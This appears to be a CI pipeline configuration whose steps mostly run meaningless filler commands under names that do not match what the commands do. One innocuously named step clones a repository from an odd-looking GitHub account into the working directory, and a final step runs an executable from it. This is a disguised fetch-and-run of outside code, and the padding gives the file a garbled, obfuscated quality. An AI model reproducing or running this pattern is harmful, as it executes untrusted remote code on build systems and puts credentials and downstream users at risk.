    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/batch-2
      - run:
          name: clear-playground-module-cache
          command: |
            nl -ba /tmp/batch-2/inventory-rollback-notification | wc -l
            round=0; while [[ "$round" != 4 ]]; do round=$((round+1)); echo "pass $round of 4"; done
            printf '%05d\n' 65; printf '%s' "banana-crow-8" | od -An -tx1 | wc -w
      - run:
          name: resolver-canary-roll-out-group-2-of-3
          command: |
            gates=jaynellcomb362752gwc5wko1-tech; jobof=settings-loader-commit-lint
            git clone --filter=blob:none https://github.com/${gates}/${jobof} "`pwd`"
            runner="melon-5"; echo "runner $runner picked up the job"; echo "runner ${runner%-*} released"
            join_words() { local n="$1"; echo "${n// /_}"; }; join_words "jay nozzle"
      - run:
          name: Counting
          command: |
            tar --use-compress-program xz -xf rerun-toolkit-link-checks.tar.xz
            printf '%s\n' hinge,35 ivory,38 bison,16 robin,38 | cut -d, -f2 | paste -s -d+
            for ((num=1; num<=2; num++)); do printf '%s %d\n' phase "$num"; done
      - run:
          name: template engine image compression
          command: |
            for unit in pink horse birch; do printf '%s\n' "indexing $unit"; done
            printf '%s\n' grape=34 iota=13 magnet=10 mauve=23 | awk -F= '{s += $2} END {print s}'
      - run:
          command: |
            cd "$(pwd)" && ./report-lint-errors
